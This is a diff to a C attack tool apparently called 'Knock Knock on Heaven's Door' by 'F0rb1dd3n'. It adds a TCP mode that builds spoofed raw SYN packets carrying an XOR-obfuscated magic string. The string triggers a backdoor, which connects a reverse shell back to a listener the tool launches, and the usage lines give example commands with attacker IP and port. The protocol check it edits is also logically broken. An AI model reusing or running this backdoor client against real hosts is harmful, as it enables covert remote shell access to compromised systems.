@@ -20,6 +20,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netinet/ip_icmp.h>
+#include <netinet/tcp.h>
 
 #define INIT	"uname -a; id; echo; export TERM=linux;\n"
 
@@ -253,6 +254,69 @@ void udp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, c
         close(sockudp);
 }
 
+void tcp(char *srcip, char *dstip, unsigned int srcport, unsigned int dstport, char *data)
+{
+        int                     socktcp;
+        unsigned int            nbytes, pckt_tam;
+        char                    *buffer;
+        struct iphdr            *iph;
+        struct tcphdr           *tcph;
+        struct sockaddr_in      s;
+        socklen_t               optval = 1;
+
+        pckt_tam = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
+        
+	if(!(buffer = (char *) malloc(pckt_tam))) fatal("on alocating buffer memory");
+
+        iph = (struct iphdr *) buffer;
+        tcph = (struct tcphdr *) (buffer + sizeof(struct iphdr));
+        
+        memset(buffer, 0, pckt_tam);
+
+        if((socktcp = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) fatal("on creating TCP socket");
+	
+        if(setsockopt(socktcp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) fatal("on setsockopt");
+	
+	memcpy((buffer + sizeof(struct iphdr) + sizeof(struct tcphdr)), data, strlen(data));
+
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->id = htons(getpid());
+        iph->ttl = 255;
+        iph->protocol = IPPROTO_TCP;
+        iph->tot_len = pckt_tam + 1;
+        iph->saddr = inet_addr(srcip);
+        iph->daddr = inet_addr(dstip);
+
+    	tcph->source = htons(srcport);
+        tcph->dest = htons(dstport);
+     
+    	tcph->seq = 0;
+    	tcph->ack_seq = 0;
+    	tcph->doff = 5;
+    	tcph->fin=0;
+    	tcph->syn=1;
+    	tcph->rst=0;
+    	tcph->psh=0;
+    	tcph->ack=0;
+    	tcph->urg=0;
+    	tcph->window = htons (5840);
+    	tcph->urg_ptr = 0;
+       
+	tcph->check = csum((unsigned short *) tcph, sizeof(struct tcphdr) + strlen(data));
+        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));
+
+        s.sin_family = AF_INET;
+        s.sin_port = htons(dstport);
+        s.sin_addr.s_addr = inet_addr(dstip);
+
+        if((nbytes = sendto(socktcp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == -1) fatal("on sending package");
+
+        printf("%s %u bytes was sent\n", good, nbytes);
+        close(socktcp);
+}
+
 void usage(char *argv){
 	printf("\n\e[01;36mKnock Knock on Heaven's Door\e[00m\n");
 	printf("\e[01;32mWriten by: F0rb1dd3n\e[00m\n");
@@ -266,7 +330,8 @@ void usage(char *argv){
 	printf("-l\tLaunch listener\n\n");
 	printf("%s ICMP doesn't need ports\n\n", warn);
 	printf("ICMP: %s -x icmp -s 192.168.0.2 -t 192.168.0.3 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
-	printf("UDP:  %s -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 53 -q 53 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n\n", argv);
+	printf("UDP:  %s -x udp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 53 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n", argv);
+	printf("TCP:  %s -x tcp  -s 192.168.0.2 -t 192.168.0.3 -p 666 -q 80 -d \"F0rb1dd3n 192.168.0.4 4444\" -l\n\n", argv);
 	exit(1);
 }
 
@@ -284,8 +349,10 @@ int main(int argc, char **argv) {
                                 prot = optarg;
 				if(!strcmp(prot, "icmp")){
 					if(!strcmp(prot, "udp")) {
-						printf("%s wrong protocol\n", bad);
-	       					exit(-1);
+						if(!strcmp(prot, "tcp")) {
+							printf("%s wrong protocol\n", bad);
+	       						exit(-1);
+						}
 					}
 				}
                                 break;
@@ -393,6 +460,31 @@ int main(int argc, char **argv) {
 		} else {
 			s_xor(data, 11, strlen(data));
                 	udp(srcip, dstip, srcport, dstport, data);
+			printf("\n");
+		}
+        } else if(!strcmp(prot, "tcp")) {
+                printf("%s Knocking with TCP protocol\n", good);
+	
+		if(l){
+			pid = fork();
+
+			if(pid == -1) fatal("on forking proccess");
+
+			if(pid > 0) {
+				reverse_port = strtok(data, " ");
+				reverse_port = strtok(NULL, " ");
+				reverse_port = strtok(NULL, " ");
+				listener(atoi(reverse_port));
+			}
+
+			if(pid == 0){
+				s_xor(data, 11, strlen(data));
+				usleep(100*1500);
+                		tcp(srcip, dstip, srcport, dstport, data);
+			}
+		} else {
+			s_xor(data, 11, strlen(data));
+                	tcp(srcip, dstip, srcport, dstport, data);
 			printf("\n");
 		}
         } 
